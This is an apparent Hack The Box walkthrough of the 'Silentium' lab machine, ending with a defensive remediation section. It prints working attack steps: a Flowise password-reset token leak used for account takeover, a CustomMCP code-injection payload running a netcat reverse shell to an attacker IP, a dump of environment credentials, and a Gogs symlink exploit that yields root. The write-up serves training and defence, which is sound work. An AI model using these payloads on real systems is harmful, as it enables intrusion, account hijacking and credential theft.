---
title: Silentium
os: Linux
difficulty: Easy
tags:
  - Account Takeover
  - Flowise
  - CVE-2025-59528
  - Environment Credentials
  - Gogs
  - CVE-2025-8110
  - Symlink Bypass
  - Privilege Escalation
---

# 🛡️ HTB - Silentium (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Silentium
- **Operating System:** Linux
- **Difficulty:** Easy
- **Vulnerabilities:** Flowise Password Reset Token Leakage (ATO), Flowise CustomMCP Node JavaScript Injection (CVE-2025-59528), Plaintext Environment Credentials, Gogs Symlink Validation Bypass (CVE-2025-8110)

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.20.232
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 14:13 UTC
Nmap scan report for 10.129.20.232
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

- 🔍 *We are targeting a Linux machine. We run Gobuster to search for active virtual hosts:*

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 50
```

```text
Found: staging.silentium.htb Status: 200 [Size: 3142]
```

- 🔍 *We locate a subdomain `staging.silentium.htb` hosting a Flowise platform instance. Checking the version:*

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

---

## Step 2 - Enumeration

- 🔍 *The Flowise version (v3.0.5) is vulnerable to unauthenticated Account Takeover (ATO) and authenticated RCE.*

> [!IMPORTANT]
> **Flowise Password Reset Token Leakage:**
> The `/api/v1/account/forgot-password` endpoint in Flowise leaks the password reset `tempToken` directly in the HTTP API response. This allows an unauthenticated attacker to request a password reset for arbitrary users and capture the reset token directly, bypassing email validation to hijack the account.

> [!NOTE]
> **Flowise CustomMCP JavaScript Injection RCE (CVE-2025-59528):**
> Authenticated users can trigger Remote Code Execution (RCE) via the CustomMCP node. During connection configuration, the node parses the `mcpServerConfig` object. In `convertToValidJSONString`, user inputs are processed directly by the `Function()` constructor. Since this executes in the global Node.js context, an attacker can access privileged modules like `child_process` to run system commands.

- 🔍 *We retrieve email names from the institutional leadership section of the main portal (Marcus Throne, Ben, Elena Rossi) and request password resets to test for active users:*

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

- 🔍 *The server responds, revealing the user exists and leaking the tempToken:*

```http
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","tempToken":"TLqOeJRfcrakNlmuZiHuzcVEKvG1XW1l67fkpi07hKRVcIxULoOcOZOezwvRkCFx",...}}
```

- 🔍 *We take over the account by sending the token to the password reset endpoint, updating the password, and logging in.*

---

## Step 3 - Initial Foothold

- 🔍 *We leverage our admin session token to send the CustomMCP RCE payload to execute a reverse shell command:*

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.253 4444 -e /bin/sh\");return 1;})()})"
    }
  }'
```

- 🔍 *Catching the shell on our netcat listener:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.37.52] 33587
# whoami
root
```

- 🔍 *We are running as root inside a Docker container. We dump local environment variables to search for secrets:*

```bash
env
```

```text
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_HOST=mailhog
```

- 🔍 *We identify a plaintext password: `r04D!!_R4ge`. Testing password reuse, we SSH into the host as `ben`:*

```bash
ssh ben@silentium.htb
```

```text
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$ 
```

- 🔍 *Host shell session established. The user flag is read from `/home/ben/user.txt`.*

---

## Step 4 - Privilege Escalation

- 🔍 *Checking running system services, we find a local instance of Gogs on port 3001:*

```bash
curl http://127.0.0.1:3001 | head
```

```text
<meta name="author" content="Gogs" />
<meta name="description" content="Gogs is a painless self-hosted Git service" />
```

- 🔍 *The running version is Gogs v0.13.3, which is vulnerable to CVE-2025-8110.*

> [!IMPORTANT]
> **Gogs Symlink Validation Bypass (CVE-2025-8110):**
> Gogs fails to recursively validate symbolic links inside repository write APIs. An attacker can commit and push a symlink pointing to `.git/config`, then issue a PUT request targeting the symlink path to overwrite the Gogs `.git/config` file. By setting the `core.sshCommand` attribute, the attacker triggers OS command execution running in the context of the service owner (which is `root` on this system).

- 🔍 *We tunnel port 3001 to our attacker machine using Chisel:*
  - Attacker: `./chisel-lin server --reverse --port 8080`
  - Target: `./chisel-lin.1 client 10.10.14.253:8080 R:9000:127.0.0.1:3001`
- 🔍 *We register a user on the local Gogs web interface (port 9000) and execute the CVE-2025-8110 script to push the symlink and overwrite the repository config:*

```bash
python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.253" -lp 6000
```

```text
[+] Authenticated successfully
Token generation status: 200
Repo creation status: 201
[master f02218c] Add malicious symlink
[+] Exploit sent, check your listener!
```

- 🔍 *Catching the root shell on our netcat listener:*

```bash
nc -lvnp 6000
```

```text
listening on [any] 6000 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.38.127] 58482
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# whoami
root
```

- 🔍 *Root access achieved. The root flag is read from `/root/root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Container Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Silentium environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Flowise Password Reset Token Leakage

> [!WARNING]
> **Vulnerability Profile:**
> The `forgot-password` API endpoint leaks the generated password reset `tempToken` in the response body.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated attackers can query the endpoint for any valid email addresses and harvest the reset token directly, achieving immediate account takeover (ATO) and administrative access to the platform.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Patch Flowise immediately. Restructure the password reset endpoint response to strictly exclude the token value, delivering it solely via secure email pathways.
> - **Detection:** Audit web traffic logs for high frequencies of requests to `/forgot-password` endpoints.

---

### 🔴 Flowise CustomMCP Arbitrary Code Execution (CVE-2025-59528)

> [!WARNING]
> **Vulnerability Profile:**
> The CustomMCP node evaluates user-supplied configuration settings inside a `Function()` constructor.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Authenticated users can inject arbitrary Node.js commands that run with the full privileges of the Flowise process, leading to container compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Flowise to a patched version that sanitizes or whitelists MCP configurations and avoids dynamic execution functions.
> - **Remediation:** Implement strong container isolation: run the application container with restricted, non-root users.

---

### 🔴 Gogs Symlink Validation Bypass (CVE-2025-8110)

> [!WARNING]
> **Vulnerability Profile:**
> Gogs fails to validate symbolic links recursively during repository updates, allowing arbitrary writes to `.git/config`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can modify `core.sshCommand` to execute arbitrary OS commands as the Gogs service owner. Since the Gogs service runs as `root`, this results in immediate host root compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade Gogs to version 0.13.4 or newer where symlink verification is enforced recursively.
> - **Remediation:** Enforce least privilege: never execute web services (like Gogs) as `root`. Restrict the service execution context to a dedicated unprivileged user (e.g. `git`).
